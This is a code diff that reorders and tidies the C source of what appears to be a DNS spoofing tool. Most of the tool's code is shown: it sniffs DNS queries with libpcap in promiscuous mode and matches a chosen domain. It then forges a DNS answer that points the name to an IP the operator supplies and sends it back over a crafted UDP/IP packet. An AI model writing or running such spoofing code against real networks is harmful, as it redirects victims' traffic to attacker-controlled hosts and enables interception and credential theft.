@@ -18,14 +18,12 @@
 #include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <string.h>
-
 #include <ctype.h>
 #include <errno.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <resolv.h>
-
 
 #define IP_SIZE 16
 #define REQUEST_SIZE 100
@@ -75,120 +73,6 @@ struct dnsanswer {
 };
 
 /**
- * Program usage
- */
-void usage(char *prog_name){
-  fprintf(stderr, "Usage:%s --interface <interface> --request <request> --ip <ip>\n", prog_name);
-  exit(-1);
-}
-
-/**
- * Parse arguments 
- */
-void parse_args(int argc, char *argv[], SpoofParams *spoof_params){
-  
-  unsigned int i; /* iterator */
-  
-  /* invalid parameters count */
-  if(argc != 7){
-    fprintf(stderr, "Too few parameters found.\n");
-    usage(argv[0]);
-  }
-  
-  for(i = 1; i < argc ; i++){
-    if(!strcmp(argv[i], "--interface")){
-      strncpy(spoof_params->interface, argv[++i], PCAP_INTERFACENAME_SIZE-1);
-      spoof_params->interface[PCAP_INTERFACENAME_SIZE-1] = '\0';
-    }
-    
-    if(!strcmp(argv[i], "--request")){
-      strncpy(spoof_params->request, argv[++i], REQUEST_SIZE-1);
-      spoof_params->request[REQUEST_SIZE-1] = '\0';
-    }
-    
-    if(!strcmp(argv[i], "--ip")){
-      strncpy(spoof_params->ip, argv[++i], IP_SIZE-1);
-      spoof_params->ip[IP_SIZE-1] = '\0';
-    }
-  }
-}
-
-/**
- * Extracts an ip from a ip header
- */
-void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
-  int i;
-  int aux[4];
-  
-  for(i=0;i<4;i++){
-    aux[i] = (raw_ip >> (i*8)) & 0xff;
-  }
-  
-  sprintf(ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
-}
-
-/**
- * Extracts the src port from a udp header
- */
-void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
-  (*port) = ntohs((*(u_int16_t*)udp));
-}
-
-/**
- * Extracts DNS query and ip from packet
- */
-void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){
-  struct etherhdr *ether;
-  struct iphdr *ip;
-  struct udphdr *udp;
-  unsigned int ip_header_size;
-  
-  /* ethernet header */
-  ether = (struct etherhdr*)(packet);
-
-  /* ip header */
-  ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
-  extract_ip_from_iphdr(ip->saddr, src_ip);
-  extract_ip_from_iphdr(ip->daddr, dst_ip);
-  
-  /* udp header */
-  ip_header_size = ip->ihl*4;
-  udp = (struct udphdr *)(((char*) ip) + ip_header_size);
-  extract_port_from_udphdr(udp, port);
-
-  /* dns header */
-  *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
-
-  dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
-  
-}
-
-/**
- * Extracts the request from a dns query
- * It comes in this format: [3]www[7]example[3]com[0]
- * And it is returned in this: www.example.com
- */
-void extract_dns_request(struct dnsquery *dns_query, char *request){
-  unsigned int i, j, k;
-  char *curr = dns_query->qname;
-  unsigned int size;
-  
-  size = curr[0];
-
-  j=0;
-  i=1;
-  while(size > 0){
-    for(k=0; k<size; k++){
-      request[j++] = curr[i+k];
-    }
-    request[j++]='.';
-    i+=size;
-    size = curr[i++];
-  }
-  request[--j] = '\0';
-}
-
-/**
  * Prints a terminal message with host IP and request
  */
 void print_message(char* request, char* ip){
@@ -226,8 +110,7 @@ void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
 /**
  * Calculates a checksum for a given header
  */
-unsigned short csum (unsigned short *buf, int nwords)
-{
+unsigned short csum(unsigned short *buf, int nwords){
   unsigned long sum;
   for (sum = 0; nwords > 0; nwords--)
     sum += *buf++;
@@ -235,8 +118,6 @@ unsigned short csum (unsigned short *buf, int nwords)
   sum += (sum >> 16);
   return ~sum;
 }
-
-
 
 /**
  * Builds an UDP/IP datagram
@@ -263,7 +144,7 @@ void build_udp_ip_datagram(char* datagram, unsigned int payload_size, char* src_
   udp_hdr->len = htons(sizeof(struct udphdr) + payload_size); //length
   udp_hdr->check = 0; //checksum - disabled
   
-  ip_hdr->ip_sum = csum ((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
+  ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
   
 }
 
@@ -289,7 +170,7 @@ unsigned int build_dns_answer(SpoofParams *spoof_params, struct dnshdr *dns_hdr,
   memcpy(&answer[10], "\x00\x00", 2); //arcount
 
   //dns_query
-  size = strlen(request)+2;
+  size = strlen(request)+2;// +1 for the size of the first string; +1 for the last '.'
   memcpy(&answer[12], dns_query, size); //qname
   size+=12;
   memcpy(&answer[size], "\x00\x01", 2); //type
@@ -316,6 +197,81 @@ unsigned int build_dns_answer(SpoofParams *spoof_params, struct dnshdr *dns_hdr,
 }
 
 /**
+ * Extracts the request from a dns query
+ * It comes in this format: [3]www[7]example[3]com[0]
+ * And it is returned in this: www.example.com
+ */
+void extract_dns_request(struct dnsquery *dns_query, char *request){
+  unsigned int i, j, k;
+  char *curr = dns_query->qname;
+  unsigned int size;
+  
+  size = curr[0];
+
+  j=0;
+  i=1;
+  while(size > 0){
+    for(k=0; k<size; k++){
+      request[j++] = curr[i+k];
+    }
+    request[j++]='.';
+    i+=size;
+    size = curr[i++];
+  }
+  request[--j] = '\0';
+}
+
+/**
+ * Extracts the src port from a udp header
+ */
+void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port){
+  (*port) = ntohs((*(u_int16_t*)udp));
+}
+
+/**
+ * Extracts an ip from a ip header
+ */
+void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip){
+  int i;
+  int aux[4];
+  
+  for(i=0;i<4;i++){
+    aux[i] = (raw_ip >> (i*8)) & 0xff;
+  }
+  
+  sprintf(ip, "%d.%d.%d.%d",aux[0], aux[1], aux[2], aux[3]);
+}
+
+/**
+ * Extracts DNS query and ip from packet
+ */
+void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port){
+  struct etherhdr *ether;
+  struct iphdr *ip;
+  struct udphdr *udp;
+  unsigned int ip_header_size;
+  
+  /* ethernet header */
+  ether = (struct etherhdr*)(packet);
+
+  /* ip header */
+  ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
+  extract_ip_from_iphdr(ip->saddr, src_ip);
+  extract_ip_from_iphdr(ip->daddr, dst_ip);
+  
+  /* udp header */
+  ip_header_size = ip->ihl*4;
+  udp = (struct udphdr *)(((char*) ip) + ip_header_size);
+  extract_port_from_udphdr(udp, port);
+
+  /* dns header */
+  *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
+
+  dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
+  
+}
+
+/**
  * Callback function to handle packets
  */
 void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
@@ -338,18 +294,19 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char 
   
   /* if it is the request that we are looking for */
   if(!strcmp(request, spoof_params->request)){
-    /* answer is pointed to the beginning of dns header*/
+
+    /* answer is pointed to the beginning of dns header */
     answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
-    
+
     /* modifies answer to attend our dns spoof and returns its size */
     datagram_size = build_dns_answer(spoof_params, dns_hdr, answer, request);
-
+    
     /* modifies udp/ip to attend our dns spoof */
     build_udp_ip_datagram(datagram, datagram_size, src_ip, dst_ip, port);
-
-    /* update the datagram size with ip and udp header*/
+    
+    /* update the datagram size with ip and udp header */
     datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
-
+    
     /* sends our dns spoof msg */
     send_dns_answer(src_ip, port, datagram, datagram_size);
     print_message(request, src_ip);
@@ -366,6 +323,8 @@ void run_filter(SpoofParams *spoof_params){
   struct bpf_program fp;         /* compiled filter */
   pcap_t *handle;
 
+  
+  memset(errbuf, 0, PCAP_ERRBUF_SIZE);
   handle = pcap_open_live(spoof_params->interface, /* device to sniff on */
                           1500,                    /* maximum number of bytes to capture per packet */
                           1,                       /* promisc - 1 to set card in promiscuous mode, 0 to not */
@@ -385,7 +344,7 @@ void run_filter(SpoofParams *spoof_params){
     errbuf[0] = 0;    /* reset error buffer */
   }
   
-  /* only DNS */
+  /* only DNS queries */
   sprintf(filter, "udp and dst port domain");
   
   /* compiles the filter expression */
@@ -400,7 +359,7 @@ void run_filter(SpoofParams *spoof_params){
     exit(-1);
   }
   
-  /* loops through the packages */
+  /* loops through the packets */
   pcap_loop(handle, -1, handle_packet, (u_char*)spoof_params);
   
   /* frees the compiled filter */
@@ -408,6 +367,45 @@ void run_filter(SpoofParams *spoof_params){
   
   /* closes the handler */
   pcap_close(handle);
+}
+
+/**
+ * Program usage
+ */
+void usage(char *prog_name){
+  fprintf(stderr, "Usage:%s --interface <interface> --request <request> --ip <ip>\n", prog_name);
+  exit(-1);
+}
+
+/**
+ * Parse arguments
+ */
+void parse_args(int argc, char *argv[], SpoofParams *spoof_params){
+  
+  unsigned int i; /* iterator */
+  
+  /* invalid parameters count */
+  if(argc != 7){
+    fprintf(stderr, "Too few parameters found.\n");
+    usage(argv[0]);
+  }
+  
+  for(i = 1; i < argc ; i++){
+    if(!strcmp(argv[i], "--interface")){
+      strncpy(spoof_params->interface, argv[++i], PCAP_INTERFACENAME_SIZE-1);
+      spoof_params->interface[PCAP_INTERFACENAME_SIZE-1] = '\0';
+    }
+    
+    if(!strcmp(argv[i], "--request")){
+      strncpy(spoof_params->request, argv[++i], REQUEST_SIZE-1);
+      spoof_params->request[REQUEST_SIZE-1] = '\0';
+    }
+    
+    if(!strcmp(argv[i], "--ip")){
+      strncpy(spoof_params->ip, argv[++i], IP_SIZE-1);
+      spoof_params->ip[IP_SIZE-1] = '\0';
+    }
+  }
 }
 
 /**
@@ -423,4 +421,3 @@ int main(int argc, char **argv){
   
   return 0;
 }
-
